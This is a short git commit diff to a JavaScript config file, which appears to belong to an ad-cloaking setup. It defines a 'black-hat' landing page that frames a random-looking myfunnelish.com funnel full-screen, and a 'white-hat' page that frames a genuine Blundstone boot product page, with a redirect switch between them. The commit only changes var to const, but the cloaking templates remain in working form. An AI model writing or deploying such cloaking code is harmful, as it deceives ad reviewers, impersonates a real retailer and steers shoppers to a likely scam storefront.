3c412fc1ab78cc354abf695c55b56935cef40113
rmeeesumraza <github@snobay.com>
2025-01-15 15:05:09 +0500

    Update config.js

--- api/config.js
+++ api/config.js
@@ -1,6 +1,6 @@
 // This file exports a boolean value to control redirection logic
 const isRedirectEnabled = true; // Change this value as needed
-var bhLP = `
+const bhLP = `
     <html>
         <body>
             <iframe style="display: block; position: absolute; width: 100%; height: 100%;" width="100%" height="100%" frameborder="0" src="https://xjsdiaoqpwepa.myfunnelish.com/imbassd-1736879310456939"></iframe>
@@ -8,7 +8,7 @@ var bhLP = `
     </html>
 `;
 
-var whLP = `
+const whLP = `
     <html>
         <body>
             <iframe style="display: block; position: absolute; width: 100%; height: 100%;" width="100%" height="100%" frameborder="0" src="https://www.blundstone.com/rustic-brown-premium-leather-chelsea-boots-womens-style-585"></iframe>
